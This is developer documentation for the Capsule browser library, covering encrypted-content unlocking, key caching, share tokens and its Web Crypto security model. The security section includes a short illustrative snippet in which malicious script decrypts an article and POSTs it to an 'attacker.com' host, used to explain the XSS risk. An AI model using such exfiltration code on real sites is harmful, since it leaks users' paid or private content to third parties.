# Client Integration

The Capsule client is a lightweight browser library that handles key management, content key caching, and content decryption using the Web Crypto API.

## Installation

```bash
npm install @sesamy/capsule
```

## Quick Start (High-Level API)

The simplest way to use Capsule - just provide an unlock function and the client handles everything automatically:

- **Key generation** - RSA key pairs created on-demand
- **content key caching** - encrypted DEKs stored for reuse
- **Auto-renewal** - rotating wrap keys are automatically renewed before expiry
- **Script execution** - `<script>` tags in decrypted HTML are executed (browsers don't run scripts inserted via innerHTML)

```
import { CapsuleClient } from '@sesamy/capsule';

// Initialize with an unlock function
const capsule = new CapsuleClient({
  unlock: async ({ keyId, wrappedContentKey, publicKey, resourceId }) => {
    // Call your server to get the encrypted DEK
    const res = await fetch('/api/unlock', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keyId, wrappedContentKey, publicKey }),
    });
    return res.json(); // { encryptedContentKey, expiresAt, periodId }
  }
});

// Unlock an article - keys auto-created if needed!
const content = await capsule.unlock(encryptedArticle);

// Or unlock by element ID (finds data-capsule attribute)
await capsule.unlockElement('article-123');

// Or process all encrypted elements on page
await capsule.processAll();
```

### Example: Encrypted Content with Embedded Script

When content is decrypted, any `<script>` tags are automatically executed. This enables interactive premium content:

```html
<!-- This is what your encrypted content might look like when decrypted -->
<article class="premium-content">
  <h2>🎉 Welcome, Premium Member!</h2>
  <p>You've unlocked exclusive content.</p>
  
  <script>
    // This script runs after decryption!
    const container = document.currentScript.parentElement;
    const confetti = ['🎊', '✨', '🌟', '💫', '🎉'];
    
    for (let i = 0; i < 20; i++) {
      const span = document.createElement('span');
      span.textContent = confetti[Math.floor(Math.random() * confetti.length)];
      span.style.cssText = `
        position: fixed;
        font-size: 24px;
        animation: fall 3s ease-in forwards;
        left: ${Math.random() * 100}vw;
        top: -30px;
        z-index: 1000;
      `;
      document.body.appendChild(span);
      setTimeout(() => span.remove(), 3000);
    }
    
    // Add a dynamic timestamp
    const time = document.createElement('p');
    time.innerHTML = '<em>Unlocked at: ' + new Date().toLocaleTimeString() + '</em>';
    container.appendChild(time);
  </script>
</article>
```

## Auto-Processing with Events

Enable `autoProcess` to automatically unlock all encrypted elements on page load:

```
const capsule = new CapsuleClient({
  unlock: myUnlockFunction,
  autoProcess: true,  // Process on page load
  executeScripts: true,  // Execute <script> in decrypted content
});

// Listen for unlock events
document.addEventListener('capsule:unlock', (e) => {
  console.log('Unlocked:', e.detail.resourceId);
  console.log('Content:', e.detail.content.substring(0, 100));
});

document.addEventListener('capsule:error', (e) => {
  console.error('Failed:', e.detail.error);
});

document.addEventListener('capsule:state', (e) => {
  console.log('State changed:', e.detail.previousState, '→', e.detail.state);
});

document.addEventListener('capsule:ready', (e) => {
  console.log('Capsule ready, public key:', e.detail.publicKey);
});
```

## HTML Markup

Add encrypted content with the `data-capsule` attribute:

```html
<div 
  id="premium-content"
  data-capsule='{"resourceId":"abc123","encryptedContent":"...","iv":"...","wrappedKeys":[...]}'
  data-capsule-id="abc123"
>
  <p>Loading encrypted content...</p>
</div>
```

## Configuration Options

```
interface CapsuleClientOptions {
  // Required for automatic unlocking
  unlock?: UnlockFunction;    // Async function to fetch encrypted DEK

  // Key settings
  keySize?: 2048 | 4096;      // RSA key size (default: 2048)

  // Processing behavior
  autoProcess?: boolean;      // Auto-process elements on init (default: false)
  executeScripts?: boolean;   // Execute <script> tags (default: true)
  selector?: string;          // CSS selector (default: '[data-capsule]')

  // content key caching
  contentKeyStorage?: 'memory' | 'session' | 'persist';  // (default: 'persist')
  renewBuffer?: number;       // Ms before expiry to auto-renew (default: 5000)

  // IndexedDB settings
  dbName?: string;            // Database name (default: 'capsule-keys')
  storeName?: string;         // Store name (default: 'keypair')

  // Debugging
  logger?: (msg, level) => void;
}
```

## API Reference

### High-Level Methods

#### getPublicKey()

Get the user's public key. **Creates keys automatically if they don't exist.**

```
const publicKey = await capsule.getPublicKey();
// Returns: Base64-encoded SPKI public key
```

#### unlock(article, preferredKeyType?)

Decrypt an encrypted article using cached content key or by fetching a new one.

```
const content = await capsule.unlock(encryptedArticle, 'shared');
// Returns: Decrypted content as string
```

#### unlockElement(resourceId)

Find an element by article ID, decrypt, and render content.

```
await capsule.unlockElement('article-123');
// Finds element with data-capsule-id="article-123"
// Decrypts and replaces innerHTML
```

#### processAll()

Process all encrypted elements on the page.

```
const results = await capsule.processAll();
// Returns: Map<resourceId, content | Error>
```

#### tryUnlockFromCache(article, preferredKeyType?)

Try to unlock using only locally-cached keys (no server call). Returns decrypted content or `null` if no cached key is available. Useful for restoring previously unlocked content on page load without a network round-trip.

```
const cached = await capsule.tryUnlockFromCache(article);
if (cached) {
  showContent(cached);
} else if (capsule.hadExpiredKeys) {
  // Returning user with expired keys — auto-renew
  const content = await capsule.unlock(article, capsule.expiredKeyType ?? 'shared');
  showContent(content);
} else {
  showPaywall();
}
```

#### hadExpiredKeys / expiredKeyType

Read-only getters available after calling `tryUnlockFromCache()`. Use them to distinguish "first visit" (no keys) from "returning user with expired keys" so the UI can auto-renew.

```
capsule.hadExpiredKeys;   // boolean — were expired keys found?
capsule.expiredKeyType;  // 'shared' | 'article' | null
```

#### prefetchSharedKey(keyId)

Pre-fetch and cache a shared key-encrypting key (KEK). After calling this, all articles encrypted for the same content ID can be unlocked locally without additional server round-trips.

```
// Pre-fetch shared key from first article
const sharedKey = articles[0].wrappedKeys.find(
  k => !k.keyId.startsWith('article:')
);
if (sharedKey) {
  await capsule.prefetchSharedKey(sharedKey.keyId);
}
// Now all unlocks for this content ID are local
for (const article of articles) {
  await capsule.unlock(article);
}
```

#### getElementState(resourceId)

Get the current processing state of an encrypted element.

```
const state = capsule.getElementState('article-123');
// Returns: 'locked' | 'unlocking' | 'decrypting' | 'unlocked' | 'error' | undefined
```

### Low-Level Methods

#### decrypt(article, encryptedContentKey)

Decrypt with a pre-fetched encrypted DEK. For full manual control.

```
const publicKey = await capsule.getPublicKey();
const { encryptedContentKey } = await myServerCall(publicKey, wrappedKey);
const content = await capsule.decrypt(encryptedArticle, encryptedContentKey);
```

#### decryptPayload(payload)

Decrypt a simple single-key payload (no envelope encryption).

```
const content = await capsule.decryptPayload({
  encryptedContent: 'base64...',
  iv: 'base64...',
  encryptedContentKey: 'base64...'
});
```

#### hasKeyPair() / getKeyInfo() / regenerateKeyPair() / clearAll()

Utility methods for key management.

```
const exists = await capsule.hasKeyPair();
const info = await capsule.getKeyInfo(); // { keySize, createdAt }
const newKey = await capsule.regenerateKeyPair();
await capsule.clearAll(); // Remove all keys and cached content keys
```

## React Integration

```
import { useState, useEffect, useRef } from 'react';
import { CapsuleClient, UnlockFunction, EncryptedArticle } from '@sesamy/capsule';

export function useEncryptedContent(encryptedData: EncryptedArticle | null) {
  const [content, setContent] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<Error | null>(null);
  const clientRef = useRef<CapsuleClient | null>(null);

  useEffect(() => {
    // Initialize client once
    const unlock: UnlockFunction = async (params) => {
      const res = await fetch('/api/unlock', {
        method: 'POST',
        body: JSON.stringify(params),
      });
      return res.json();
    };

    clientRef.current = new CapsuleClient({ unlock });
  }, []);

  const handleUnlock = async () => {
    if (!clientRef.current || !encryptedData) return;
    
    setIsLoading(true);
    setError(null);
    
    try {
      const decrypted = await clientRef.current.unlock(encryptedData);
      setContent(decrypted);
    } catch (err) {
      setError(err instanceof Error ? err : new Error('Unlock failed'));
    } finally {
      setIsLoading(false);
    }
  };

  return { content, isLoading, error, handleUnlock };
}

// Usage
function Article({ encryptedData }) {
  const { content, isLoading, error, handleUnlock } = useEncryptedContent(encryptedData);

  if (content) return <div dangerouslySetInnerHTML={{ __html: content }} />;
  if (isLoading) return <p>Unlocking...</p>;
  if (error) return <p>Error: {error.message}</p>;
  
  return <button onClick={handleUnlock}>Unlock</button>;
}
```

## DEK Storage Modes

Control how decrypted DEKs are cached for performance and offline access:

| Mode | Storage | Persistence | Use Case |
| --- | --- | --- | --- |
| `'memory'` | JavaScript | Page refresh | Maximum security |
| `'session'` | sessionStorage | Tab close | Balance security/UX |
| `'persist'` | IndexedDB | Browser restart | Best offline support |

Note: DEKs are stored **encrypted** with the user's public key. They must be unwrapped using the private key each time (which never leaves the browser's crypto subsystem).

## Share Link Token Handling

The client library provides utilities for working with DCA share link tokens -- publisher-signed ES256 JWTs that grant access to specific content without a subscription.

### Auto-Detecting Share Tokens from URL

Use the static `getShareTokenFromUrl()` helper to check if the current URL contains a share token:

```
import { DcaClient, parseShareToken } from '@sesamy/capsule';

// Standalone function (no client instance needed)
const shareToken = parseShareToken();

// Or via the static method
const shareToken = DcaClient.getShareTokenFromUrl();

// Or use a custom parameter name
const shareToken = DcaClient.getShareTokenFromUrl('token');
```

### Unlocking with a Share Token

Call `unlockWithShareToken()` instead of the normal `unlock()`. The share token is included in the unlock request body so the issuer can validate it:

```
import { DcaClient } from '@sesamy/capsule';

const client = new DcaClient();
const page = client.parsePage();

const shareToken = DcaClient.getShareTokenFromUrl();
if (shareToken) {
  // Unlock using share token as authorization
  const keys = await client.unlockWithShareToken(page, "sesamy", shareToken);
  const html = await client.decrypt(page, "bodytext", keys);
  document.querySelector('[data-dca-content-name="bodytext"]')!.innerHTML = html;
  
  // Clean the share token from the URL (cosmetic)
  const url = new URL(window.location.href);
  url.searchParams.delete("share");
  history.replaceState({}, "", url);
}
```

### How It Works Under the Hood

`unlockWithShareToken()` is a convenience wrapper around `unlock()`. It adds the `shareToken` field to the unlock request body so the issuer knows to use share-link authorization instead of subscription checks:

```
// What unlockWithShareToken sends to the issuer:
POST /api/unlock
{
  "resourceJWT": "eyJ...",
  "keys": [
    { "contentName": "bodytext", "scope": "...", "contentKey": "..." }
  ],
  "shareToken": "eyJ..."    // <- Share link token added here
}

// The issuer verifies the share token signature (ES256, publisher-signed),
// validates claims (domain, resourceId, expiry, contentNames),
// then returns key material from the normal DCA manifest.
// No rotationSecret needed -- keys flow through the normal DCA channel.
```

### Security Notes

- The share token is an opaque ES256 JWT signed by the publisher -- the client does not verify its signature (the issuer does that)
- The token carries no key material -- it is purely an authorization grant
- Tokens are bearer credentials: anyone with the URL has access until expiry
- The issuer validates the token against its trusted-publisher key allowlist -- no new secrets needed

## Security Model

### Private Key Protection: The Core Guarantee

The Capsule client's security foundation is that **the private key cannot be extracted from the browser**, even by the user or malicious JavaScript code.

#### How Non-Extractable Keys Work

When generating a key pair, the private key is stored with `extractable: false`:

```
const privateKey = await crypto.subtle.importKey(
  'jwk',
  privateKeyJwk,
  { name: 'RSA-OAEP', hash: 'SHA-256' },
  false,  // NOT extractable - enforced by browser engine
  ['unwrapKey']
);
```

This means:

- The key can be **used** for unwrapping DEKs
- The key cannot be **exported** in any format (JWK, PKCS8, raw bytes)
- The key cannot be **copied** to another device or browser
- The key cannot be **downloaded** or sent to a server

#### What About IndexedDB Access?

Users and JavaScript code **can access IndexedDB** through DevTools or browser APIs:

```
// You CAN retrieve the key object
const db = await indexedDB.open('capsule-keys');
const keyPair = await db.get('keypair', 'default');
console.log(keyPair.privateKey); 
// Output: CryptoKey {type: "private", extractable: false, ...}

// But you CANNOT export the key material
await crypto.subtle.exportKey('jwk', keyPair.privateKey);
// Error: "key is not extractable"

await crypto.subtle.exportKey('pkcs8', keyPair.privateKey);
// Error: "key is not extractable"

// Even this doesn't help
JSON.stringify(keyPair.privateKey);
// Returns: "{}" (empty object)

const blob = new Blob([keyPair.privateKey]);
// Creates: "[object CryptoKey]" (useless string)
```

The `CryptoKey` object in IndexedDB is just a **handle** or **reference** to the actual key material, which lives in the browser's secure crypto subsystem. Think of it like a key to a safe deposit box that only works inside the bank - you can use it there, but you can't take the contents home.

#### Attack Vector Analysis

| Attack Type | Can Extract Key? | Notes |
| --- | --- | --- |
| Server compromise | No | Key never sent to server |
| Network interception | No | Key never transmitted |
| XSS / malicious JS | No | Can use key, cannot export it |
| Browser DevTools | No | Can see object, not bytes |
| Database breach | No | No server-side key storage |
| User manual export | No | Browser prevents all export methods |

The **only** attack that works is using the key for its intended purpose:

```
// Malicious code CAN do this:
const decryptedContent = await client.unlock(article);
await fetch('https://attacker.com', { 
  method: 'POST', 
  body: decryptedContent  // Send decrypted content (not the key!)
});
```

This is why **XSS protection** (Content Security Policy, input sanitization) remains critical - not to protect the key itself, but to prevent unauthorized **use** of the key.

### Additional Security Layers

- **DEKs in Memory Only**: Unwrapped content keys are cached in JavaScript memory (not persisted) and lost on page refresh
- **AES-GCM Authentication**: 128-bit auth tags prevent tampering with encrypted content
- **Web Crypto API**: Uses hardware-accelerated cryptography when available (TPM, Secure Enclave)
- **Secure Context Requirement**: Web Crypto API only works over HTTPS or localhost
- **Origin Isolation**: IndexedDB is bound to the origin - other websites cannot access your keys

### What This Means for Your Application

- **Server compromise cannot leak user keys** - They're not on the server
- **Database breach cannot decrypt content** - Private keys are client-side only
- **Network eavesdropping is ineffective** - Only wrapped content keys are transmitted
- **Users cannot accidentally export their keys** - Browser prevents it
- **True end-to-end encryption** - Only the user's browser can decrypt

### Limitations and Trade-offs

- **Key loss means data loss**: If a user clears browser data or switches devices, they lose access
- **No cross-device sync**: Keys are tied to a single browser profile
- **XSS can still abuse keys**: Malicious code can decrypt content (though not steal keys)

Consider implementing:

- Server-side encrypted key backup (wrapped with user password)
- Multi-device key synchronization (using secure key exchange protocols)
- Content Security Policy (CSP) to prevent XSS attacks

## DCA Client

The package also exports a `DcaClient` for Distributed Content Access -- a protocol where publishers embed encrypted content and key metadata directly in the HTML and keys are obtained from issuer endpoints.

### Quick Start (One-Liner)

The simplest integration -- auto-detects the issuer and share token, then decrypts and renders everything:

```
import { DcaClient, hasDcaContent } from '@sesamy/capsule';

if (hasDcaContent()) {
  const client = new DcaClient();
  const content = await client.processPage();
  client.renderToPage(content);
}
```

### Step-by-Step

For more control, use the individual methods:

```
import { DcaClient } from '@sesamy/capsule';

const client = new DcaClient();

// Parse DCA data from the current page
const page = client.parsePage();

// Unlock via an issuer
const keys = await client.unlock(page, 'sesamy');

// Decrypt a specific content item
const html = await client.decrypt(page, 'bodytext', keys);

// Inject into the DOM
document.querySelector('[data-dca-content-name="bodytext"]')!.innerHTML = html;

// Or decrypt everything at once
const all = await client.decryptAll(page, keys);
for (const [name, content] of Object.entries(all)) {
  document.querySelector(`[data-dca-content-name="${name}"]`)!.innerHTML = content;
}
```

### HTML Structure

DCA pages contain a single `<script class="dca-manifest">` element holding the v0.10 manifest -- both the wrapped ciphertext blocks and the issuer metadata live inside it:

```html
<!-- DCA manifest -->
<script class="dca-manifest" type="application/json">
{
  "version": "0.10",
  "resourceJWT": "eyJ...",
  "content": {
    "bodytext": {
      "contentType": "text/html",
      "iv": "...",
      "aad": "...",
      "ciphertext": "BASE64URL_CIPHERTEXT",
      "wrappedContentKey": [
        { "kid": "2026-04-15", "iv": "...", "ciphertext": "..." }
      ]
    }
  },
  "issuers": {
    "sesamy": { "unlockUrl": "https://api.sesamy.com/unlock", "keyId": "..." }
  }
}
</script>
```

### Configuration

```
interface DcaClientOptions {
  // Custom fetch function (e.g. to add auth headers)
  fetch?: typeof globalThis.fetch;

  // Custom unlock function -- replaces the default fetch-based unlock
  unlockFn?: (unlockUrl: string, body: unknown) => Promise<DcaUnlockResponse>;

  // Wrap key cache for reusing wrap keys across pages
  wrapKeyCache?: DcaWrapKeyCache | false;
}

interface DcaWrapKeyCache {
  get(key: string): Promise<string | null>;
  set(key: string, value: string): Promise<void>;
}
```

### API Reference

#### parsePage(root?)

Parse the DCA manifest (including wrapped ciphertext blocks) from the DOM.

```
const page = client.parsePage();
// Or from a specific container
const page = client.parsePage(document.getElementById('article'));
```

#### parseJsonResponse(json)

Parse a DCA manifest from a JSON API response instead of the DOM.

```
const res = await fetch('/api/article/123');
const page = client.parseJsonResponse(await res.json());
```

#### unlock(page, issuerName, additionalBody?)

Request key material from an issuer's unlock endpoint. Pass extra fields (e.g. auth tokens) via `additionalBody`.

```
const keys = await client.unlock(page, 'sesamy', {
  authToken: 'Bearer ...',
});
```

#### decrypt(page, contentName, unlockResponse)

Decrypt a single content item. Supports both direct content keys and wrap-key delivery.

```
const html = await client.decrypt(page, 'bodytext', keys);
```

#### decryptAll(page, unlockResponse)

Decrypt all content items and return a name -> content map.

```
const results = await client.decryptAll(page, keys);
// { bodytext: '<p>...</p>', sidebar: '<div>...</div>' }
```

#### processPage(options?)

Convenience method that combines parse -> unlock -> decryptAll in a single call. Auto-detects the issuer (first key in `manifest.issuers`) and share token (from URL `?share=` parameter) unless overridden:

```
// Simplest usage -- auto-detect everything
const content = await client.processPage();

// With explicit options
const content = await client.processPage({
  issuerName: 'sesamy',         // override auto-detected issuer
  shareToken: null,             // skip share token detection
  root: someElement,            // scope DOM parsing
  additionalBody: { auth: '...' } // extra fields for unlock request
});
```

#### renderToPage(content, root?)

Inject decrypted content into the DOM. Finds elements with matching `data-dca-content-name` attributes and sets their `innerHTML`. Returns a `Set` of content names that were rendered:

```
const content = await client.processPage();
const rendered = client.renderToPage(content);
console.log('Rendered:', [...rendered]); // ['bodytext', 'sidebar']
```

#### DcaClient.hasDcaContent(root?)

Static method. Checks whether the page (or a given root element) contains DCA content by looking for a `<script class="dca-manifest">` element. Also available as a standalone import:

```
import { hasDcaContent } from '@sesamy/capsule';

if (hasDcaContent()) {
  // Page has DCA content -- initialize client
}
```

### Wrap Key Caching

DCA supports wrap keys -- keyed by `kid` -- that can decrypt content keys locally. Provide a cache to reuse them across page navigations. Entries are stored under `dca:wk:{scope}:{kid}`:

```
// Simple sessionStorage-based cache
const cache = {
  async get(key: string) {
    return sessionStorage.getItem(key);
  },
  async set(key: string, value: string) {
    sessionStorage.setItem(key, value);
  },
};

const client = new DcaClient({ wrapKeyCache: cache });

// First page: keys fetched from issuer, wrapKeys cached
const page1 = client.parsePage();
const keys1 = await client.unlock(page1, 'sesamy');
await client.decrypt(page1, 'bodytext', keys1);

// Next page: if the same kid is still referenced, no server call needed
const page2 = client.parsePage();
const keys2 = await client.unlock(page2, 'sesamy');
await client.decrypt(page2, 'bodytext', keys2); // Uses cached wrapKey
```

## Browser Compatibility

Capsule requires the Web Crypto API, which is available in:

- Chrome 37+
- Firefox 34+
- Safari 11+
- Edge 79+

Note: Web Crypto API is only available in secure contexts (HTTPS or localhost).
